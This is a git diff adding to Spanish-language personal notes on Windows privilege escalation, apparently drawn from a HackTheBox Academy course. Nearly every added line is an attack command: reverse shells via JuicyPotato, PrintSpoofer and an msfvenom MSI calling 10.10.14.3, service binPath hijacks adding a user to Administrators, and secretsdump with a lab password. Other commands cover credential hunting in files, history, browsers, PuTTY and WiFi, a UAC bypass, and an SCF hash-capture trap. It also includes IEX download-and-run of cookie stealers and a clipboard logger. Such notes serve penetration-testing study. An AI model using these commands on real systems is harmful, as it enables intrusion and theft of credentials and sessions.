@@ -11,7 +11,8 @@ route print
 #Tabla de routeo
 netstat -ano
 #Es el netstat -nat de linux pero en windows
-
+netstat -ano | findstr <puerto>
+#Enumeracion de los puertos
 
 ## Enumeracion de protecciones
 Get-MpComputerStatus
@@ -77,6 +78,10 @@ JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 1
 #Este script (https://github.com/ohpe/juicy-potato) permite abusarnos del permiso. El comando de arriba nos devuelve una reverse shell como NT/Authority System
 PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 #JuicyPotato no funciona para Windows Server 2019 y Windows 10 compilación 1809. Este otro script nos permite abusarnos del privilegio
+[!]
+En el caso de error 10038 se debe al CLSID. Para buscar uno visitar: https://github.com/ohpe/juicy-potato/tree/master/CLSID
+La flag para especificarlo es -c "{CLSID}"
+[!]
 
 SeDebugPrivilege
 #Privilegio que sirve para ejecutar una aplicacion o servicio en particular para no agregar la cuenta al grupo admin.
@@ -233,3 +238,224 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 #Ejecutar el tool
 ExploitCapcom.exe
 #Explotar
+
+Server Operators
+#Este grupo permite administrar windows sin los privilegios de admin de dominio. Los privilegios que brinda son SeBackupPrivilege y SeRestorePrivilege
+sc qc AppReadiness
+#Verificar si se iniciar como sustem
+PsService.exe security AppReadiness
+#Con este tool, se puede comprobar los permisos en el servicio (PsService es como una variante de sc).
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators <nuestro usuario> /add"
+#Este comando nos permite agregar nuestro usr al grupo de administradores. Se puede modificar lo que se ejecuta con el comando que queramos
+sc start AppReadiness
+#Se inicia el servicio (se espera que falle el inicio)
+net localgroup Administrators
+#Verificacion de nuestro usuario en el grupo
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+#Verificamos el acceso al dominio con las credenciales
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+#Dumpeamos las pwd
+
+## Permisos debiles
+.\SharpUp.exe audit
+#Tool que sirve para auditar en busqueda de binarios con ACLs debiles
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+#Con icalcs se revisan los permisos del binario (El binario detectado en el modulo es el de arriba)
+accesschk.exe /accepteula -quvcw WindscribeService
+#Accesschk permite tambien revisar los permisos. En este caso de un binario que SharpUp detecto como modificable
+sc config WindscribeService binPath= "cmd /c net localgroup Administrators <nuestro usuario> /add"
+#Modificar el binario para agregarnos como admin. [!] Probar tirando una revshell a nuestra maquina
+
+## Kernel exploits
+https://msrc.microsoft.com/update-guide/vulnerability
+#Pagina donde se encuentran los diferentes CVEs
+
+icacls c:\Windows\System32\config\SAM
+#Verificar por vulnerabilidad HiveNightmare la cual se da cuando SAM puede ser leeido por BUILTIN\Users
+https://github.com/GossiTheDog/HiveNightmare
+#POC
+
+
+## Servicios vulnerables
+wmic product get name
+#Permite obtener los nombres y versiones de las aplicaciones instaladas
+get-service | ? {$_.DisplayName -like '<nombre>*'}
+#Enumeracion del servicio
+
+
+## Busqueda de credenciales: Archivos
+where /R C:\ *.txt
+#Busca por todos los archivos .txt
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+#findstrt nos permite buscar por extensiones de archivos
+inetpub\wwwroot\web.config
+#Archivo que puede contener credenciales dentro
+gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+#Buscar en archivos de diccionario de chrome. Estos archvios contiene las palabras que se agregan al diccionario para evitar el subrayado rojo
+unattend.xml
+#En estos archvios se pueden definir configuraciones de inicio de sesion automatico
+https://github.com/SnaffCon/Snaffler
+#En un entorno AD se puede usar este tool para enumerar por archivos (.kdbx, .vmdk, .vdhx, .ppk, etc) en unidades compartidas
+cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
+#Busqueda manual en \Documents
+select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+#Buscar con ps mediante una key (password en este ejemplo)
+Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+#Buscar extensiones de archivos
+C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
+#Revisar las sticky notes del usuario. Nos interesa los plum.sqlite*
+(Get-PSReadLineOption).HistorySavePath
+#Para conocer la ubicacion del historial
+gc (Get-PSReadLineOption).HistorySavePath
+#Leer el hsitorial
+foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+#En caso de tener acceso, se puede intentar leer el resto de historiales con un for
+https://academy.hackthebox.com/module/67/section/640
+#En caso de que se encuentre almacenada una password en un ps1, se puede acceder a estas mediante el ingreso de las variables y la siguiente sintaxis
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+#Suponiendo que en el .ps1 se encuentre esta linea, se pueden ejecutar los siguientes comandos para obtener usuario y password
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+$credential.GetNetworkCredential().username
+$credential.GetNetworkCredential().password
+#La primer linea es la ejecucion de lo mismo que se encuentra en .ps1. Las siguientes son para obtener el usr y pass.
+
+## Busqueda de credenciales: Defaults Logins
+cmdkey /list
+#Permite listar a que hosts se tiene guardada la password para conectarnos sin ingresarla
+runas /savecred /user:inlanefreight\bob "<comando>"
+#Permite correr comandos como otro usuario reutilizando las credenciales
+.\SharpChrome.exe logins /unprotect
+#https://github.com/GhostPack/SharpDPAPI Permite obtener cokies e inicios de sesioin almacenados en chrome
+.\lazagne.exe all
+#https://github.com/AlessandroZ/LaZagne tool que permite enumerar credenciales con diferentes modulos
+
+Import-Module .\SessionGopher.ps1
+#https://github.com/Arvanaghi/SessionGopher tool que permite obtener inicions de sesion de PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP
+Invoke-SessionGopher -Target <target>
+#Enumerar el target
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+#Permite enumerar default login para el sistem
+
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+#Permite enumerar las sesiones existentes
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<sesion>
+#Permite enumerar los valores de la sesion especificada
+
+## Busqueda de credenciales: Wifi
+netsh wlan show profile
+#Listar las conexiones recientes de wifi
+netsh wlan show profile <red> key=clear
+#En caso de que la configuracion lo permita, se puede obtener el Key Content de la red
+
+## Citrix Breakout: User
+\\127.0.0.1\$c\users\<usuario>\documents\
+#Para poder leer archivos se puede utilizar paint o un bloc de notas y en archivos > abrir buscar por lo de arriba
+<file>.bat
+#Los archivos bat pueden ejecutarse. En el caso de necesiatr una shell puede crearse un txt con 'cmd' adentro y luego cambiarle la extension a bat
+Set-ExecutionPolicy Bypass -Scope Process
+#Permite ejecuion de ps1
+Import-Module .\PowerUp.ps1
+Write-UserAddMSI
+#Esto crea un msi para poder agregar un usuario al grupo Administradores para luego loguearnos con runas (runas /user:backdoor cmd)
+
+## Citrix Breakout: Privesc
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep
+#Permite bypasear UAC para poder acceder a la carpeta del usr Administrator
+
+## Mas tecnicas: Usuarios
+Get-LocalUser
+#Informacion de las cuenta de usuario con descripciones
+Get-WmiObject -Class Win32_OperatingSystem | select Description
+#Infomracion de la computadora con la descripcion de la misma
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+#Este codigo permite comparar las entradas en busca de passwords. Se actualiza cada 2 segundos buscando las diferencias
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+#Con el codigo de arriba y nombrando al file como "@<nombre>.scf", el explorador de archivos haria una peticion a la ip especificada. [!]El nombre del archvio debe ser similar a uno que se use para que el usuario caiga
+sudo responder -wrf -v -I tun0
+#Para interceptar el hash
+
+## Mas tecnicas: Pillaging
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+#Obtener programas, path y versiones con PS
+
+## Mas tecnicas: Robo de cookies
+https://github.com/clr2of8/SlackExtract
+#Tool para el robo de slack
+%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release
+#Path donde se almacenan las cookies en Firefox
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+#cookies.sqlite es el archivo donde se almacena
+https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
+python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+#Extraer las cookies de slack de la base de datos de firefox
+
+https://github.com/djhohnstein/SharpChromium
+#Tool para robo de cookies en navegadores basados en chromium
+https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+Invoke-SharpChromium -Command "cookies slack.com"
+#Sirve para extraer las cookies del sqlite que usa chrome
+[!]
+Posible error
+[!]
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+#SharpChromium busca en %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies pero las cookies pueden encontrarse en %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies. Por eso, se realiza la copia
+
+## Mas tecnicas: Portapapeles
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+Invoke-ClipboardLogger
+#Comienza a monitorear las entradas del pportapapeles
+Get-Clipboard
+#Permite obtener los datos del portapapeles actual
+
+## Mas tecnicas: Always privileged
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+#Enumerar si "Always install with elevated privileges" esta habilitado
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+#Esto puede aprovecharse creando un paquete msi con una revshell a nuestra maquina
+msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+#Ejecutar el msi creado
+
+## Mas tecncias: Unidades compartidas
+https://github.com/SnaffCon/Snaffler
+#Permite enumerar un sistema buscando por archivos o nombres de archivos que puedan servir
+.vhd, .vhdx y .vmdk
+#Estos archivos son discos virtuales
+guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
+#Montar disco .vmdk
+guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
+#Montar disco .vhd o .vhdx
+[!]
+En caso de tener acceso GUI a windows, se puede usar el administrador de discos o con la opcion haciendo click derecho sobre el archivo
+[!]
+
+## End of life systems: Windows Server
+wmic qfe
+#Este comando devuelve el hotfix en que se encuentra el sistema. 
+
+https://github.com/rasta-mouse/Sherlock.git
+#Este tool permite enumerar en un sistema viejo los patches que no tiene
+Set-ExecutionPolicy bypass -Scope process
+Import-Module .\Sherlock.ps1
+Find-AllVulns
+#Ejecutar sherlock
+
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+#Es un tool que devuelve recomendaciones de exploits a usar dependiendo del comando systeminfo
